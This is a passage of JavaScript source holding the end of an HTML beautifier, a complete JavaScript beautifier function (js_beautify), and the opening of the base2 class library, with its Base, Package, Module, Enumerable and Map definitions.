    this.tags = { //An object to hold tags, their position, and their parent-tags, initiated with default values
      parent: 'parent1',
      parentcount: 1,
      parent1: ''
    };
    this.tag_type = '';
    this.token_text = this.last_token = this.last_text = this.token_type = '';

    
    this.Utils = { //Uilities made available to the various functions
      whitespace: "\n\r\t ".split(''),
      single_token: 'br,input,link,meta,!doctype,basefont,base,area,hr,wbr,param,img,isindex,?xml,embed'.split(','), //all the single tags for HTML
      extra_liners: 'head,body,/html'.split(','), //for tags that need a line of whitespace before them
      in_array: function (what, arr) {
        for (var i=0; i<arr.length; i++) {
          if (what === arr[i]) {
            return true;
          }
        }
        return false;
      }
    }
    
    this.get_content = function () { //function to capture regular content between tags
      
      var char = '';
      var content = [];
      var space = false; //if a space is needed
      while (this.input.charAt(this.pos) !== '<') {
        if (this.pos >= this.input.length) {
          return content.length?content.join(''):['', 'TK_EOF'];
        }
        
        char = this.input.charAt(this.pos);
        this.pos++;
        this.line_char_count++;
        
        
        if (this.Utils.in_array(char, this.Utils.whitespace)) {
          if (content.length) {
            space = true;
          }
          this.line_char_count--;
          continue; //don't want to insert unnecessary space
        }
        else if (space) {
          if (this.line_char_count >= this.max_char) { //insert a line when the max_char is reached
            content.push('\n');
            for (var i=0; i<this.indent_level; i++) {
              content.push(this.indent_string);
            }
            this.line_char_count = 0;
          }
          else{
            content.push(' ');
            this.line_char_count++;
          }
          space = false;
        }
        content.push(char); //letter at-a-time (or string) inserted to an array
      }
      return content.length?content.join(''):'';
    }
     
    this.get_script = function () { //get the full content of a script to pass to js_beautify
      
      var char = '';
      var content = [];
      var reg_match = new RegExp('\<\/script' + '\>', 'igm');
      reg_match.lastIndex = this.pos;
      var reg_array = reg_match.exec(this.input);
      var end_script = reg_array?reg_array.index:this.input.length; //absolute end of script
      while(this.pos < end_script) { //get everything in between the script tags
        if (this.pos >= this.input.length) {
          return content.length?content.join(''):['', 'TK_EOF'];
        }
        
        char = this.input.charAt(this.pos);
        this.pos++;
        
        
        content.push(char);
      }
      return content.length?content.join(''):''; //we might not have any content at all
    }
    
    this.record_tag = function (tag){ //function to record a tag and its parent in this.tags Object
      if (this.tags[tag + 'count']) { //check for the existence of this tag type
        this.tags[tag + 'count']++;
        this.tags[tag + this.tags[tag + 'count']] = this.indent_level; //and record the present indent level
      }
      else { //otherwise initialize this tag type
        this.tags[tag + 'count'] = 1;
        this.tags[tag + this.tags[tag + 'count']] = this.indent_level; //and record the present indent level
      }
      this.tags[tag + this.tags[tag + 'count'] + 'parent'] = this.tags.parent; //set the parent (i.e. in the case of a div this.tags.div1parent)
      this.tags.parent = tag + this.tags[tag + 'count']; //and make this the current parent (i.e. in the case of a div 'div1')
    }
    
    this.retrieve_tag = function (tag) { //function to retrieve the opening tag to the corresponding closer
      if (this.tags[tag + 'count']) { //if the openener is not in the Object we ignore it
        var temp_parent = this.tags.parent; //check to see if it's a closable tag.
        while (temp_parent) { //till we reach '' (the initial value);
          if (tag + this.tags[tag + 'count'] === temp_parent) { //if this is it use it
            break;
          }
          temp_parent = this.tags[temp_parent + 'parent']; //otherwise keep on climbing up the DOM Tree
        }
        if (temp_parent) { //if we caught something
          this.indent_level = this.tags[tag + this.tags[tag + 'count']]; //set the indent_level accordingly
          this.tags.parent = this.tags[temp_parent + 'parent']; //and set the current parent
        }
        delete this.tags[tag + this.tags[tag + 'count'] + 'parent']; //delete the closed tags parent reference...
        delete this.tags[tag + this.tags[tag + 'count']]; //...and the tag itself
        if (this.tags[tag + 'count'] == 1) {
          delete this.tags[tag + 'count'];
        }
        else {
          this.tags[tag + 'count']--;
        }
      }
    }
      
    this.get_tag = function () { //function to get a full tag and parse its type
      var char = '';
      var content = [];
      var space = false;

      do {
        if (this.pos >= this.input.length) {
          return content.length?content.join(''):['', 'TK_EOF'];
        }
        
        char = this.input.charAt(this.pos);
        this.pos++;
        this.line_char_count++;
        
        if (this.Utils.in_array(char, this.Utils.whitespace)) { //don't want to insert unnecessary space
          space = true;
          this.line_char_count--;
          continue;
        }
        
        if (char === "'" || char === '"') {
          if (!content[1] || content[1] !== '!') { //if we're in a comment strings don't get treated specially
            char += this.get_unformatted(char);
            space = true;
          }
        }
        
        if (char === '=') { //no space before =
          space = false;
        }
        
        if (content.length && content[content.length-1] !== '=' && char !== '>'
            && space) { //no space after = or before >
          if (this.line_char_count >= this.max_char) {
            this.print_newline(false, content);
            this.line_char_count = 0;
          }
          else {
            content.push(' ');
            this.line_char_count++;
          }
          space = false;
        }
        content.push(char); //inserts character at-a-time (or string)
      } while (char !== '>');
      
      var tag_complete = content.join('');
      var tag_index;
      if (tag_complete.indexOf(' ') != -1) { //if there's whitespace, thats where the tag name ends
        tag_index = tag_complete.indexOf(' ');
      }
      else { //otherwise go with the tag ending
        tag_index = tag_complete.indexOf('>');
      }
      var tag_check = tag_complete.substring(1, tag_index).toLowerCase();
      if (tag_complete.charAt(tag_complete.length-2) === '/' ||
          this.Utils.in_array(tag_check, this.Utils.single_token)) { //if this tag name is a single tag type (either in the list or has a closing /)
        this.tag_type = 'SINGLE';
      }
      else if (tag_check === 'script') { //for later script handling
        this.record_tag(tag_check);
        this.tag_type = 'SCRIPT';
      }
      else if (tag_check === 'style') { //for future style handling (for now it justs uses get_content)
        this.record_tag(tag_check);
        this.tag_type = 'STYLE';
      }
      else if (tag_check.charAt(0) === '!') { //peek for <!-- comment
        if (tag_check.indexOf('[if') != -1) { //peek for <!--[if conditional comment
          if (tag_complete.indexOf('!IE') != -1) { //this type needs a closing --> so...
            var comment = this.get_unformatted('-->', tag_complete); //...delegate to get_unformatted
            content.push(comment);
          }
          this.tag_type = 'START';
        }
        else if (tag_check.indexOf('[endif') != -1) {//peek for <!--[endif end conditional comment
          this.tag_type = 'END';
          this.unindent();
        }
        else if (tag_check.indexOf('[cdata[') != -1) { //if it's a <[cdata[ comment...
          var comment = this.get_unformatted(']]>', tag_complete); //...delegate to get_unformatted function
          content.push(comment);
          this.tag_type = 'SINGLE'; //<![CDATA[ comments are treated like single tags
        }
        else {
          var comment = this.get_unformatted('-->', tag_complete);
          content.push(comment);
          this.tag_type = 'SINGLE';
        }
      }
      else {
        if (tag_check.charAt(0) === '/') { //this tag is a double tag so check for tag-ending
          this.retrieve_tag(tag_check.substring(1)); //remove it and all ancestors
          this.tag_type = 'END';
        }
        else { //otherwise it's a start-tag
          this.record_tag(tag_check); //push it on the tag stack
          this.tag_type = 'START';
        }
        if (this.Utils.in_array(tag_check, this.Utils.extra_liners)) { //check if this double needs an extra line
          this.print_newline(true, this.output);
        }
      }
      return content.join(''); //returns fully formatted tag
    }
    
    this.get_unformatted = function (delimiter, orig_tag) { //function to return unformatted content in its entirety
      
      if (orig_tag && orig_tag.indexOf(delimiter) != -1) {
        return '';
      }
      var char = '';
      var content = '';
      var space = true;
      do {
        
        
        char = this.input.charAt(this.pos);
        this.pos++
        
        if (this.Utils.in_array(char, this.Utils.whitespace)) {
          if (!space) {
            this.line_char_count--;
            continue;
          }
          if (char === '\n' || char === '\r') {
            content += '\n';
            for (var i=0; i<this.indent_level; i++) {
              content += this.indent_string;
            }
            space = false; //...and make sure other indentation is erased
            this.line_char_count = 0;
            continue;
          }
        }
        content += char;
        this.line_char_count++;
        space = true;
        
        
      } while (content.indexOf(delimiter) == -1);
      return content;
    }
    
    this.get_token = function () { //initial handler for token-retrieval
      var token;
      
      if (this.last_token === 'TK_TAG_SCRIPT') { //check if we need to format javascript
        var temp_token = this.get_script();
        if (typeof temp_token !== 'string') {
          return temp_token;
        }
        token = js_beautify(temp_token, this.indent_size, this.indent_character, this.indent_level); //call the JS Beautifier
        return [token, 'TK_CONTENT'];
      }
      if (this.current_mode === 'CONTENT') {
        token = this.get_content();
        if (typeof token !== 'string') {
          return token;
        }
        else {
          return [token, 'TK_CONTENT'];
        }
      }
      
      if(this.current_mode === 'TAG') {
        token = this.get_tag();
        if (typeof token !== 'string') {
          return token;
        }
        else {
          var tag_name_type = 'TK_TAG_' + this.tag_type;
          return [token, tag_name_type];
        }
      }
    }
    
    this.printer = function (js_source, indent_character, indent_size, max_char) { //handles input/output and some other printing functions
      
      this.input = js_source || ''; //gets the input for the Parser
      this.output = [];
      this.indent_character = indent_character || ' ';
      this.indent_string = '';
      this.indent_size = indent_size || 2;
      this.indent_level = 0;
      this.max_char = max_char || 70; //maximum amount of characters per line
      this.line_char_count = 0; //count to see if max_char was exceeded
      
      for (var i=0; i<this.indent_size; i++) {
        this.indent_string += this.indent_character;
      }
      
      this.print_newline = function (ignore, arr) {
        this.line_char_count = 0;
        if (!arr || !arr.length) {
          return;
        }
        if (!ignore) { //we might want the extra line
          while (this.Utils.in_array(arr[arr.length-1], this.Utils.whitespace)) {
            arr.pop();
          }
        }
        arr.push('\n');
        for (var i=0; i<this.indent_level; i++) {
          arr.push(this.indent_string);
        }
      }
      
      
      this.print_token = function (text) {
        this.output.push(text);
      }
      
      this.indent = function () {
        this.indent_level++;
      }
      
      this.unindent = function () {
        if (this.indent_level > 0) {
          this.indent_level--;
        }
      }
    }
    return this;
  }
  
  /*_____________________--------------------_____________________*/
  
  
  
  multi_parser = new Parser(); //wrapping functions Parser
  multi_parser.printer(html_source, indent_character, indent_size); //initialize starting values
  
  
  
  while (true) {
      var t = multi_parser.get_token();
      multi_parser.token_text = t[0];
      multi_parser.token_type = t[1];
    
    if (multi_parser.token_type === 'TK_EOF') {
      break;
    }
    

    switch (multi_parser.token_type) {
      case 'TK_TAG_START': case 'TK_TAG_SCRIPT': case 'TK_TAG_STYLE':
        multi_parser.print_newline(false, multi_parser.output);
        multi_parser.print_token(multi_parser.token_text);
        multi_parser.indent();
        multi_parser.current_mode = 'CONTENT';
        break;
      case 'TK_TAG_END':
        multi_parser.print_newline(true, multi_parser.output);
        multi_parser.print_token(multi_parser.token_text);
        multi_parser.current_mode = 'CONTENT';
        break;
      case 'TK_TAG_SINGLE':
        multi_parser.print_newline(false, multi_parser.output);
        multi_parser.print_token(multi_parser.token_text);
        multi_parser.current_mode = 'CONTENT';
        break;
      case 'TK_CONTENT':
        if (multi_parser.token_text !== '') {
          multi_parser.print_newline(false, multi_parser.output);
          multi_parser.print_token(multi_parser.token_text);
        }
        multi_parser.current_mode = 'TAG';
        break;
    }
    multi_parser.last_token = multi_parser.token_type;
    multi_parser.last_text = multi_parser.token_text;
  }
  return multi_parser.output.join('');
}



function js_beautify(js_source_text, indent_size, indent_character, indent_level)
{

    var input, output, token_text, last_type, last_text, last_word, current_mode, modes, indent_string;
    var whitespace, wordchar, punct, parser_pos, line_starters, in_case;
    var prefix, token_type, do_block_just_closed, var_line, var_line_tainted;



    function trim_output()
    {
        while (output.length && (output[output.length - 1] === ' ' || output[output.length - 1] === indent_string)) {
            output.pop();
        }
    }

    function print_newline(ignore_repeated)
    {
        ignore_repeated = typeof ignore_repeated === 'undefined' ? true: ignore_repeated;
        
        trim_output();

        if (!output.length) {
            return; // no newline on start of file
        }

        if (output[output.length - 1] !== "\n" || !ignore_repeated) {
            output.push("\n");
        }
        for (var i = 0; i < indent_level; i++) {
            output.push(indent_string);
        }
    }



    function print_space()
    {
        var last_output = output.length ? output[output.length - 1] : ' ';
        if (last_output !== ' ' && last_output !== '\n' && last_output !== indent_string) { // prevent occassional duplicate space
            output.push(' ');
        }
    }


    function print_token()
    {
        output.push(token_text);
    }

    function indent()
    {
        indent_level++;
    }


    function unindent()
    {
        if (indent_level) {
            indent_level--;
        }
    }


    function remove_indent()
    {
        if (output.length && output[output.length - 1] === indent_string) {
            output.pop();
        }
    }


    function set_mode(mode)
    {
        modes.push(current_mode);
        current_mode = mode;
    }


    function restore_mode()
    {
        do_block_just_closed = current_mode === 'DO_BLOCK';
        current_mode = modes.pop();
    }


    function in_array(what, arr)
    {
        for (var i = 0; i < arr.length; i++)
        {
            if (arr[i] === what) {
                return true;
            }
        }
        return false;
    }



    function get_next_token()
    {
        var n_newlines = 0;
        var c = '';

        do {
            if (parser_pos >= input.length) {
                return ['', 'TK_EOF'];
            }
            c = input.charAt(parser_pos);

            parser_pos += 1;
            if (c === "\n") {
                n_newlines += 1;
            }
        }
        while (in_array(c, whitespace));

        if (n_newlines > 1) {
            for (var i = 0; i < 2; i++) {
                print_newline(i === 0);
            }
        }
        var wanted_newline = (n_newlines === 1);


        if (in_array(c, wordchar)) {
            if (parser_pos < input.length) {
                while (in_array(input.charAt(parser_pos), wordchar)) {
                    c += input.charAt(parser_pos);
                    parser_pos += 1;
                    if (parser_pos === input.length) {
                        break;
                    }
                }
            }

            // small and surprisingly unugly hack for 1E-10 representation
            if (parser_pos !== input.length && c.match(/^[0-9]+[Ee]$/) && input.charAt(parser_pos) === '-') {
                parser_pos += 1;

                var t = get_next_token(parser_pos);
                c += '-' + t[0];
                return [c, 'TK_WORD'];
            }

            if (c === 'in') { // hack for 'in' operator
                return [c, 'TK_OPERATOR'];
            }
            return [c, 'TK_WORD'];
        }
        
        if (c === '(' || c === '[') {
            return [c, 'TK_START_EXPR'];
        }

        if (c === ')' || c === ']') {
            return [c, 'TK_END_EXPR'];
        }

        if (c === '{') {
            return [c, 'TK_START_BLOCK'];
        }

        if (c === '}') {
            return [c, 'TK_END_BLOCK'];
        }

        if (c === ';') {
            return [c, 'TK_END_COMMAND'];
        }

        if (c === '/') {
            var comment = '';
            // peek for comment /* ... */
            if (input.charAt(parser_pos) === '*') {
                parser_pos += 1;
                if (parser_pos < input.length) {
                    while (! (input.charAt(parser_pos) === '*' && input.charAt(parser_pos + 1) && input.charAt(parser_pos + 1) === '/') && parser_pos < input.length) {
                        comment += input.charAt(parser_pos);
                        parser_pos += 1;
                        if (parser_pos >= input.length) {
                            break;
                        }
                    }
                }
                parser_pos += 2;
                return ['/*' + comment + '*/', 'TK_BLOCK_COMMENT'];
            }
            // peek for comment // ...
            if (input.charAt(parser_pos) === '/') {
                comment = c;
                while (input.charAt(parser_pos) !== "\x0d" && input.charAt(parser_pos) !== "\x0a") {
                    comment += input.charAt(parser_pos);
                    parser_pos += 1;
                    if (parser_pos >= input.length) {
                        break;
                    }
                }
                parser_pos += 1;
                if (wanted_newline) {
                    print_newline();
                }
                return [comment, 'TK_COMMENT'];
            }

        }

        if (c === "'" || // string
        c === '"' || // string
        (c === '/' &&
        ((last_type === 'TK_WORD' && last_text === 'return') || (last_type === 'TK_START_EXPR' || last_type === 'TK_END_BLOCK' || last_type === 'TK_OPERATOR' || last_type === 'TK_EOF' || last_type === 'TK_END_COMMAND')))) { // regexp
            var sep = c;
            var esc = false;
            c = '';

            if (parser_pos < input.length) {

                while (esc || input.charAt(parser_pos) !== sep) {
                    c += input.charAt(parser_pos);
                    if (!esc) {
                        esc = input.charAt(parser_pos) === '\\';
                    } else {
                        esc = false;
                    }
                    parser_pos += 1;
                    if (parser_pos >= input.length) {
                        break;
                    }
                }

            }

            parser_pos += 1;
            if (last_type === 'TK_END_COMMAND') {
                print_newline();
            }
            return [sep + c + sep, 'TK_STRING'];
        }

        if (in_array(c, punct)) {
            while (parser_pos < input.length && in_array(c + input.charAt(parser_pos), punct)) {
                c += input.charAt(parser_pos);
                parser_pos += 1;
                if (parser_pos >= input.length) {
                    break;
                }
            }
            return [c, 'TK_OPERATOR'];
        }

        return [c, 'TK_UNKNOWN'];
    }


    //----------------------------------

    indent_character = indent_character || ' ';
    indent_size = indent_size || 4;

    indent_string = '';
    while (indent_size--) {
        indent_string += indent_character;
    }

    input = js_source_text;

    last_word = ''; // last 'TK_WORD' passed
    last_type = 'TK_START_EXPR'; // last token type
    last_text = ''; // last token text
    output = [];

    do_block_just_closed = false;
    var_line = false;
    var_line_tainted = false;

    whitespace = "\n\r\t ".split('');
    wordchar = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$'.split('');
    punct = '+ - * / % & ++ -- = += -= *= /= %= == === != !== > < >= <= >> << >>> >>>= >>= <<= && &= | || ! !! , : ? ^ ^= |='.split(' ');

    // words which should always start on new line.
    line_starters = 'continue,try,throw,return,var,if,switch,case,default,for,while,break,function'.split(',');

    // states showing if we are currently in expression (i.e. "if" case) - 'EXPRESSION', or in usual block (like, procedure), 'BLOCK'.
    // some formatting depends on that.
    current_mode = 'BLOCK';
    modes = [current_mode];

    indent_level = indent_level || 0;
    parser_pos = 0; // parser position
    in_case = false; // flag for parser that case/default has been processed, and next colon needs special attention
    while (true) {
        var t = get_next_token(parser_pos);
        token_text = t[0];
        token_type = t[1];
        if (token_type === 'TK_EOF') {
            break;
        }

        switch (token_type) {

        case 'TK_START_EXPR':
            var_line = false;
            set_mode('EXPRESSION');
            if (last_type === 'TK_END_EXPR' || last_type === 'TK_START_EXPR') {
                // do nothing on (( and )( and ][ and ]( ..
            } else if (last_type !== 'TK_WORD' && last_type !== 'TK_OPERATOR') {
                print_space();
            } else if (in_array(last_word, line_starters) && last_word !== 'function') {
                print_space();
            }
            print_token();
            break;

        case 'TK_END_EXPR':
            print_token();
            restore_mode();
            break;

        case 'TK_START_BLOCK':
            
            if (last_word === 'do') {
                set_mode('DO_BLOCK');
            } else {
                set_mode('BLOCK');
            }
            if (last_type !== 'TK_OPERATOR' && last_type !== 'TK_START_EXPR') {
                if (last_type === 'TK_START_BLOCK') {
                    print_newline();
                } else {
                    print_space();
                }
            }
            print_token();
            indent();
            break;

        case 'TK_END_BLOCK':
            if (last_type === 'TK_START_BLOCK') {
                // nothing
                trim_output();
                unindent();
            } else {
                unindent();
                print_newline();
            }
            print_token();
            restore_mode();
            break;

        case 'TK_WORD':

            if (do_block_just_closed) {
                print_space();
                print_token();
                print_space();
                break;
            }

            if (token_text === 'case' || token_text === 'default') {
                if (last_text === ':') {
                    // switch cases following one another
                    remove_indent();
                } else {
                    // case statement starts in the same line where switch
                    unindent();
                    print_newline();
                    indent();
                }
                print_token();
                in_case = true;
                break;
            }


            prefix = 'NONE';
            if (last_type === 'TK_END_BLOCK') {
                if (!in_array(token_text.toLowerCase(), ['else', 'catch', 'finally'])) {
                    prefix = 'NEWLINE';
                } else {
                    prefix = 'SPACE';
                    print_space();
                }
            } else if (last_type === 'TK_END_COMMAND' && (current_mode === 'BLOCK' || current_mode === 'DO_BLOCK')) {
                prefix = 'NEWLINE';
            } else if (last_type === 'TK_END_COMMAND' && current_mode === 'EXPRESSION') {
                prefix = 'SPACE';
            } else if (last_type === 'TK_WORD') {
                prefix = 'SPACE';
            } else if (last_type === 'TK_START_BLOCK') {
                prefix = 'NEWLINE';
            } else if (last_type === 'TK_END_EXPR') {
                print_space();
                prefix = 'NEWLINE';
            }

            if (last_type !== 'TK_END_BLOCK' && in_array(token_text.toLowerCase(), ['else', 'catch', 'finally'])) {
                print_newline();
            } else if (in_array(token_text, line_starters) || prefix === 'NEWLINE') {
                if (last_text === 'else') {
                    // no need to force newline on else break
                    print_space();
                } else if ((last_type === 'TK_START_EXPR' || last_text === '=') && token_text === 'function') {
                    // no need to force newline on 'function': (function
                    // DONOTHING
                } else if (last_type === 'TK_WORD' && (last_text === 'return' || last_text === 'throw')) {
                    // no newline between 'return nnn'
                    print_space();
                } else if (last_type !== 'TK_END_EXPR') {
                    if ((last_type !== 'TK_START_EXPR' || token_text !== 'var') && last_text !== ':') {
                        // no need to force newline on 'var': for (var x = 0...)
                        if (token_text === 'if' && last_type === 'TK_WORD' && last_word === 'else') {
                            // no newline for } else if {
                            print_space();
                        } else {
                            print_newline();
                        }
                    }
                } else {
                    if (in_array(token_text, line_starters) && last_text !== ')') {
                        print_newline();
                    }
                }
            } else if (prefix === 'SPACE') {
                print_space();
            }
            print_token();
            last_word = token_text;

            if (token_text === 'var') {
                var_line = true;
                var_line_tainted = false;
            }

            break;

        case 'TK_END_COMMAND':

            print_token();
            var_line = false;
            break;

        case 'TK_STRING':

            if (last_type === 'TK_START_BLOCK' || last_type === 'TK_END_BLOCK') {
                print_newline();
            } else if (last_type === 'TK_WORD') {
                print_space();
            }
            print_token();
            break;

        case 'TK_OPERATOR':

            var start_delim = true;
            var end_delim = true;
            if (var_line && token_text !== ',') {
                var_line_tainted = true;
                if (token_text === ':') {
                    var_line = false;
                }
            }

            if (token_text === ':' && in_case) {
                print_token(); // colon really asks for separate treatment
                print_newline();
                break;
            }

            in_case = false;

            if (token_text === ',') {
                if (var_line) {
                    if (var_line_tainted) {
                        print_token();
                        print_newline();
                        var_line_tainted = false;
                    } else {
                        print_token();
                        print_space();
                    }
                } else if (last_type === 'TK_END_BLOCK') {
                    print_token();
                    print_newline();
                } else {
                    if (current_mode === 'BLOCK') {
                        print_token();
                        print_newline();
                    } else {
                        // EXPR od DO_BLOCK
                        print_token();
                        print_space();
                    }
                }
                break;
            } else if (token_text === '--' || token_text === '++') { // unary operators special case
                if (last_text === ';') {
                    // space for (;; ++i)
                    start_delim = true;
                    end_delim = false;
                } else {
                    start_delim = false;
                    end_delim = false;
                }
            } else if (token_text === '!' && last_type === 'TK_START_EXPR') {
                // special case handling: if (!a)
                start_delim = false;
                end_delim = false;
            } else if (last_type === 'TK_OPERATOR') {
                start_delim = false;
                end_delim = false;
            } else if (last_type === 'TK_END_EXPR') {
                start_delim = true;
                end_delim = true;
            } else if (token_text === '.') {
                // decimal digits or object.property
                start_delim = false;
                end_delim = false;

            } else if (token_text === ':') {
                // zz: xx
                // can't differentiate ternary op, so for now it's a ? b: c; without space before colon
                if (last_text.match(/^\d+$/)) {
                    // a little help for ternary a ? 1 : 0;
                    start_delim = true;
                } else {
                    start_delim = false;
                }
            }
            if (start_delim) {
                print_space();
            }

            print_token();

            if (end_delim) {
                print_space();
            }
            break;

        case 'TK_BLOCK_COMMENT':

            print_newline();
            print_token();
            print_newline();
            break;

        case 'TK_COMMENT':

            // print_newline();
            print_space();
            print_token();
            print_newline();
            break;

        case 'TK_UNKNOWN':
            print_token();
            break;
        }

        last_type = token_type;
        last_text = token_text;
    }

    return output.join('');

}
var base2 = {
  name: "base2",
  version: "1.0",
  exports: "Base,Package,Abstract,Module,Enumerable,Map,Collection,RegGrp,Undefined,Null,This,True,False,assignID,detect,global",
  namespace: ""
};
new
function(_y) {
  var Undefined = K(),
  Null = K(null),
  True = K(true),
  False = K(false),
  This = function() {
    return this
  };
  var global = This();
  var base2 = global.base2;
  var _z = /%([1-9])/g;
  var _g = /^\s\s*/;
  var _h = /\s\s*$/;
  var _i = /([\/()[\]{}|*+-.,^$?\\])/g;
  var _9 = /try/.test(detect) ? /\bbase\b/: /.*/;
  var _a = ["constructor", "toString", "valueOf"];
  var _j = detect("(jscript)") ? new RegExp("^" + rescape(isNaN).replace(/isNaN/, "\\w+") + "$") : {
    test: False
  };
  var _k = 1;
  var _2 = Array.prototype.slice;
  _5();
  function assignID(a) {
    if (!a.base2ID) a.base2ID = "b2_" + _k++;
    return a.base2ID
  };
  var _b = function(a, b) {
    base2.__prototyping = this.prototype;
    var c = new this;
    if (a) extend(c, a);
    delete base2.__prototyping;
    var e = c.constructor;
    function d() {
      if (!base2.__prototyping) {
        if (this.constructor == arguments.callee || this.__constructing) {
          this.__constructing = true;
          e.apply(this, arguments);
          delete this.__constructing
        } else {
          return extend(arguments[0], c)
        }
      }
      return this
    };
    c.constructor = d;
    for (var f in Base) d[f] = this[f];
    d.ancestor = this;
    d.base = Undefined;
    if (b) extend(d, b);
    d.prototype = c;
    if (d.init) d.init();
    return d
  };
  var Base = _b.call(Object, {
    constructor: function() {
      if (arguments.length > 0) {
        this.extend(arguments[0])
      }
    },
    base: function() {},
    extend: delegate(extend)
  },
  Base = {
    ancestorOf: function(a) {
      return _7(this, a)
    },
    extend: _b,
    forEach: function(a, b, c) {
      _5(this, a, b, c)
    },
    implement: function(a) {
      if (typeof a == "function") {
        a = a.prototype
      }
      extend(this.prototype, a);
      return this
    }
  });
  var Package = Base.extend({
    constructor: function(e, d) {
      this.extend(d);
      if (this.init) this.init();
      if (this.name && this.name != "base2") {
        if (!this.parent) this.parent = base2;
        this.parent.addName(this.name, this);
        this.namespace = format("var %1=%2;", this.name, String2.slice(this, 1, -1))
      }
      if (e) {
        var f = base2.JavaScript ? base2.JavaScript.namespace: "";
        e.imports = Array2.reduce(csv(this.imports),
        function(a, b) {
          var c = h(b) || h("JavaScript." + b);
          return a += c.namespace
        },
        "var base2=(function(){return this.base2})();" + base2.namespace + f) + lang.namespace;
        e.exports = Array2.reduce(csv(this.exports),
        function(a, b) {
          var c = this.name + "." + b;
          this.namespace += "var " + b + "=" + c + ";";
          return a += "if(!" + c + ")" + c + "=" + b + ";"
        },
        "", this) + "this._l" + this.name + "();";
        var g = this;
        var i = String2.slice(this, 1, -1);
        e["_l" + this.name] = function() {
          Package.forEach(g,
          function(a, b) {
            if (a && a.ancestorOf == Base.ancestorOf) {
              a.toString = K(format("[%1.%2]", i, b));
              if (a.prototype.toString == Base.prototype.toString) {
                a.prototype.toString = K(format("[object %1.%2]", i, b))
              }
            }
          })
        }
      }
      function h(a) {
        a = a.split(".");
        var b = base2,
        c = 0;
        while (b && a[c] != null) {
          b = b[a[c++]]
        }
        return b
      }
    },
    exports: "",
    imports: "",
    name: "",
    namespace: "",
    parent: null,
    addName: function(a, b) {
      if (!this[a]) {
        this[a] = b;
        this.exports += "," + a;
        this.namespace += format("var %1=%2.%1;", a, this.name)
      }
    },
    addPackage: function(a) {
      this.addName(a, new Package(null, {
        name: a,
        parent: this
      }))
    },
    toString: function() {
      return format("[%1]", this.parent ? String2.slice(this.parent, 1, -1) + "." + this.name: this.name)
    }
  });
  var Abstract = Base.extend({
    constructor: function() {
      throw new TypeError("Abstract class cannot be instantiated.");
    }
  });
  var _m = 0;
  var Module = Abstract.extend(null, {
    namespace: "",
    extend: function(a, b) {
      var c = this.base();
      var e = _m++;
      c.namespace = "";
      c.partial = this.partial;
      c.toString = K("[base2.Module[" + e + "]]");
      Module[e] = c;
      c.implement(this);
      if (a) c.implement(a);
      if (b) {
        extend(c, b);
        if (c.init) c.init()
      }
      return c
    },
    forEach: function(c, e) {
      _5(Module, this.prototype,
      function(a, b) {
        if (typeOf(a) == "function") {
          c.call(e, this[b], b, this)
        }
      },
      this)
    },
    implement: function(a) {
      var b = this;
      var c = b.toString().slice(1, -1);
      if (typeof a == "function") {
        if (!_7(a, b)) {
          this.base(a)
        }
        if (_7(Module, a)) {
          for (var e in a) {
            if (b[e] === undefined) {
              var d = a[e];
              if (typeof d == "function" && d.call && a.prototype[e]) {
                d = _n(a, e)
              }
              b[e] = d
            }
          }
          b.namespace += a.namespace.replace(/base2\.Module\[\d+\]/g, c)
        }
      } else {
        extend(b, a);
        _c(b, a)
      }
      return b
    },
    partial: function() {
      var c = Module.extend();
      var e = c.toString().slice(1, -1);
      c.namespace = this.namespace.replace(/(\w+)=b[^\)]+\)/g, "$1=" + e + ".$1");
      this.forEach(function(a, b) {
        c[b] = partial(bind(a, c))
      });
      return c
    }
  });
  function _c(a, b) {
    var c = a.prototype;
    var e = a.toString().slice(1, -1);
    for (var d in b) {
      var f = b[d],
      g = "";
      if (d.charAt(0) == "@") {
        if (detect(d.slice(1))) _c(a, f)
      } else if (!c[d]) {
        if (d == d.toUpperCase()) {
          g = "var " + d + "=" + e + "." + d + ";"
        } else if (typeof f == "function" && f.call) {
          g = "var " + d + "=base2.lang.bind('" + d + "'," + e + ");";
          c[d] = _o(a, d)
        }
        if (a.namespace.indexOf(g) == -1) {
          a.namespace += g
        }
      }
    }
  };
  function _n(a, b) {
    return function() {
      return a[b].apply(a, arguments)
    }
  };
  function _o(b, c) {
    return function() {
      var a = _2.call(arguments);
      a.unshift(this);
      return b[c].apply(b, a)
    }
  };
  var Enumerable = Module.extend({
    every: function(c, e, d) {
      var f = true;
      try {
        forEach(c,
        function(a, b) {
          f = e.call(d, a, b, c);
          if (!f) throw StopIteration;
        })
      } catch(error) {
        if (error != StopIteration) throw error;
      }
      return !! f
    },
    filter: function(e, d, f) {
      var g = 0;
      return this.reduce(e,
      function(a, b, c) {
        if (d.call(f, b, c, e)) {
          a[g++] = b
        }
        return a
      },
      [])
    },
    invoke: function(b, c) {
      var e = _2.call(arguments, 2);
      return this.map(b, (typeof c == "function") ?
      function(a) {
        return a == null ? undefined: c.apply(a, e)
      }: function(a) {
        return a == null ? undefined: a[c].apply(a, e)
      })
    },
    map: function(c, e, d) {
      var f = [],
      g = 0;
      forEach(c,
      function(a, b) {
        f[g++] = e.call(d, a, b, c)
      });
      return f
    },
    pluck: function(b, c) {
      return this.map(b,
      function(a) {
        return a == null ? undefined: a[c]
      })
    },
    reduce: function(c, e, d, f) {
      var g = arguments.length > 2;
      forEach(c,
      function(a, b) {
        if (g) {
          d = e.call(f, d, a, b, c)
        } else {
          d = a;
          g = true
        }
      });
      return d
    },
    some: function(a, b, c) {
      return ! this.every(a, not(b), c)
    }
  });
  var _1 = "#";
  var Map = Base.extend({
    constructor: function(a) {
      if (a) this.merge(a)
    },
    clear: function() {
      for (var a in this) if (a.indexOf(_1) == 0) {
        delete this[a]
      }
    },
    copy: function() {
      base2.__prototyping = true;
      var a = new this.constructor;
      delete base2.__prototyping;
      for (var b in this) if (this[b] !== a[b]) {
        a[b] = this[b]
      }
      return a
    },
    forEach: function(a, b) {
      for (var c in this) if (c.indexOf(_1) == 0) {
        a.call(b, this[c], c.slice(1), this)
      }
    },
    get: function(a) {
      return this[_1 + a]
    },
    getKeys: function() {
      return this.map(II)
    },
    getValues: function() {
      return this.map(I)
    },
    has: function(a) {
      /*@cc_on @*/
      /*@if(@_jscript_version<5.5)return $Legacy.has(this,_1+a);@else @*/
      return _1 + a in this;
      /*@end @*/
    },
    merge: function(b) {
      var c = flip(this.put);
      forEach(arguments,
      function(a) {
        forEach(a, c, this)
      },
      this);
      return this
    },
    put: function(a, b) {
      this[_1 + a] = b
    },
    remove: function(a) {
